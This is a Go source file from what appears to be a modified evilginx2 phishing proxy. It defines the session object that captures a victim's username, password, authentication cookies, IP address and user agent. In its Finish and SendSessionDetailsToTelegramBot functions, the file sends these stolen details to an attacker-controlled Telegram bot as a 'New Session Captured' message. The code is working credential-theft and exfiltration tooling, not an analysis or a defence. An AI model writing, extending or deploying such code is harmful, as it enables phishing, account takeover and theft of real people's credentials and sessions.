package core

import (
	//"bytes"
	//"encoding/json"
	"fmt"
	"io"
	"os"

	//"mime/multipart"
	"net/http"
	"net/url"

	//"os"
	"regexp"
	"strings"

	"time"

	//"io/fs"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type Session struct {
	Id               string
	Name             string
	Username         string
	Password         string
	Custom           map[string]string
	Params           map[string]string
	BodyTokens       map[string]string
	HttpTokens       map[string]string
	CookieTokens     map[string]map[string]*database.CookieToken
	RedirectURL      string
	IsDone           bool
	IsAuthUrl        bool
	IsForwarded      bool
	ProgressIndex    int
	RedirectCount    int
	PhishLure        *Lure
	RedirectorName   string
	LureDirPath      string
	DoneSignal       chan struct{}
	RemoteAddr       string
	UserAgent        string
	TelegramBotToken string
	TelegramChatID   string
}

func getConfigValue(key string) string {
	return os.Getenv(key)
}

func NewSession(name string, cfg *Config) (*Session, error) {
	s := &Session{
		Id:               GenRandomToken(),
		Name:             name,
		Username:         "",
		Password:         "",
		Custom:           make(map[string]string),
		Params:           make(map[string]string),
		BodyTokens:       make(map[string]string),
		HttpTokens:       make(map[string]string),
		RedirectURL:      "",
		IsDone:           false,
		IsAuthUrl:        false,
		IsForwarded:      false,
		ProgressIndex:    0,
		RedirectCount:    0,
		PhishLure:        nil,
		RedirectorName:   "",
		LureDirPath:      "",
		DoneSignal:       make(chan struct{}),
		RemoteAddr:       "",
		UserAgent:        "",
		TelegramBotToken: cfg.GetTelegramBotToken(),
		TelegramChatID:   cfg.GetTelegramUserID(),
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	if tk, ok := s.CookieTokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
	} else {
		s.CookieTokens[domain][key] = &database.CookieToken{
			Name:     key,
			Value:    value,
			HttpOnly: http_only,
		}
	}

}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		// Remove the cookie sending part
		// Just return true to indicate all tokens are captured
		return true
	}
	return false
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
	// Log a message indicating that Finish function is called and whether it's an authentication URL

	// Send session details to Telegram bot
	go s.SendSessionDetailsToTelegramBot()
	//go s.SendCapturedCookieTokensToTelegramBot()
}

func (s *Session) SendSessionDetailsToTelegramBot() {
	// Start with the basic session details
	sessionMessage := fmt.Sprintf(
		"<b>New Session Captured</b>\n\n"+
			"<code>Name:</code> <b>%s</b>\n"+
			"<code>Username:</code> <i>%s</i>\n"+
			"<code>Password:</code> <span class=\"tg-spoiler\">%s</span>\n"+
			"<code>Landing URL:</code> <u>%s</u>\n"+
			"<code>IP Address:</code> <code>%s</code>\n"+
			"<code>User Agent:</code> <pre>%s</pre>",
		s.Name, s.Username, s.Password, s.RedirectURL, s.RemoteAddr, s.UserAgent)

	// Add only the values of custom fields to the message
	if len(s.Custom) > 0 {
		sessionMessage += "\n\n<b>Custom Fields:</b>\n"
		for _, value := range s.Custom {
			sessionMessage += fmt.Sprintf("<i>%s</i>\n", value)
		}
	}

	// Log the session message (without HTML tags for console readability)
	fmt.Println("Session message:", stripHTMLTags(sessionMessage))

	// Check if Telegram bot token and user ID are set
	if s.TelegramBotToken == "" || s.TelegramChatID == "" {
		log.Warning("Telegram bot token or user ID not set. Telegram notifications are disabled.")
		return
	}

	// Send session details to Telegram bot
	go SendFormattedMessageToTelegramBot(sessionMessage, s.TelegramBotToken, s.TelegramChatID)
}

// SendFormattedMessageToTelegramBot sends an HTML-formatted message to a Telegram bot
func SendFormattedMessageToTelegramBot(message, botToken, chatID string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	data := url.Values{}
	data.Set("chat_id", chatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")

	resp, err := http.PostForm(apiURL, data)
	if err != nil {
		log.Error("Error sending message to Telegram bot: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		log.Error("Telegram API error (status code %d): %s", resp.StatusCode, string(bodyBytes))

		// Check for common errors
		errorMsg := string(bodyBytes)
		if strings.Contains(errorMsg, "chat not found") {
			log.Error("Telegram chat ID '%s' not found. Make sure the bot is added to the group/channel if using group/channel ID", chatID)
		} else if strings.Contains(errorMsg, "bot was blocked by the user") {
			log.Error("Telegram bot was blocked by the user with ID '%s'", chatID)
		} else if strings.Contains(errorMsg, "bot is not a member") {
			log.Error("Telegram bot is not a member of the chat '%s'. Add the bot to the group/channel", chatID)
		}
	}
}

// Helper function to strip HTML tags for console logging
func stripHTMLTags(s string) string {
	return regexp.MustCompile("<[^>]*>").ReplaceAllString(s, "")
}
